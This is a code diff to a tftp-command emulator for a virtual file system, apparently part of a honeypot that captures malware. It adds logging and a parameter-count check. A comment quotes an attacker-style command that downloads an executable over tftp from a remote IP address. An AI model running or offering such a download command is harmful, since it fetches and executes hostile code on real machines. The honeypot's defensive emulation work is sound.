@@ -25,7 +25,7 @@
  *
  *******************************************************************************/
 
-/* $Id: VFSCommandTFTP.cpp 2096 2005-10-23 18:59:41Z common $ */
+/* $Id: VFSCommandTFTP.cpp 2205 2005-12-16 13:09:23Z common $ */
 
 #include "VFSCommandTFTP.hpp"
 #include "VFSNode.hpp"
@@ -61,8 +61,14 @@ VFSCommandTFTP::~VFSCommandTFTP()
 int32_t VFSCommandTFTP::run(vector<string> *paramlist)
 { // "tftp.exe -i 84.60.21.184 get IExplore327.exe"
 
+	logPF();
 	vector <string> slist = *paramlist;
 
+	if (slist.size() < 4 )
+	{
+		logWarn("expected 4 parameters, got %i\n",slist.size());
+		return 1;
+	}
 
 	string ip = slist[1];
 	string file = slist[3];
